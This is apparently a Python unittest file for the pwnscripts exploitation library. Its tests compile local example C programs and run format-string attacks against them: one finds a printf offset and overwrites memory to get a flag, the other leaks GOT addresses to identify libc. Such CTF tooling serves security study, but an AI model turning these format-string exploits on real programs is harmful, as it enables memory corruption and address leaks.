import unittest as ut
from pwnscripts import *

class BinTests(ut.TestCase):
    def test_common_sense(self):
        # check base necessities
        assert not path.isfile('1.out')
        assert not path.isfile('2.out')
        assert path.isfile('/usr/bin/gcc')
    
    def test_printf_buffer_bruteforce(self):
        print()
        try:
            system('./examples/1.c')    # compile the program
            context.log_level = 'warn'
            context.binary = '1.out'
            
            @context.quiet
            def printf(l: str): # First, a function to abstract C printf() i/o
                r = context.binary.process()
                r.sendafter('\n', l)
                return r.recvline()
            
            # Let's say we want to write to s[64]. We first find the printf() offset to s[]:
            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
                offset = fsb.find_offset.buffer(printf, maxlen=49)  # maxlen is 50-1 (-1 due to fgets)
            
            # Then, make use of pwntools' fmtstr library to write to there:
            r = context.binary.process()
            s_addr = extract_first_hex(r.recvline())  #another pwnscripts func
            payload = fmtstr_payload(offset, {s_addr+56: 0x12345678}, write_size='short')
            r.sendline(payload)
            
            # Finally, grab back the input (and verify that the flag is there)
            lastline = r.recvall().split(b'\n')[-1]
            r.close()
            self.assertEqual(lastline, b'flag{Goodjob}')
            
        finally:
            system('rm 1.out')
        
    def test_libc_db(self):
        print()
        try:
            system('./examples/2.c')    # compile the program
            context.log_level = 'warn'
            context.binary = '2.out'
            proc = {'argv':['./2.out'], 'env':{"LD_PRELOAD": "examples/ld-2.27.so examples/libc.so.6"}}
            GOT_table = ['__libc_start_main', 'printf', 'fgets']
            GOT_addrs = list(map(lambda s: context.binary.got[s], GOT_table))
            
            @context.quiet
            def printf(l:str):
                r = process(**proc)
                r.send(l)
                return r.recvline()
            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
                buf_off = fsb.find_offset.buffer(printf)

            # send a printf GOT table leak exploit
            r = process(**proc)
            payload = fsb.leak.deref_payload(buf_off, GOT_addrs)
            assert len(payload) < 64
            r.sendline(payload)
            
            # grab the leaked addresses and pass them to libc_find() for detection
            libc_addrs = map(lambda b:extract_first_bytes(b,6),fsb.leak.deref_extractor(r.recvall()))
            libc_dict = dict(zip(GOT_table, libc_addrs))
            path_to_libcdb = input("path to libc-database: ").strip()
            assert path.isdir(path_to_libcdb)
            with attrib_set_to(context, 'log_level', 'info') as _:  # show info for testing purposes
                db = libc_find(path_to_libcdb, libc_dict)

            # test the libc id found
            r = process(**proc)
            r.sendline(db.identifier)
            r.recvline()
            self.assertEqual(r.recvline().strip(), b'flag{congrats}')
            
        finally:
            system('rm 2.out')

if __name__ == '__main__':
    ut.main()
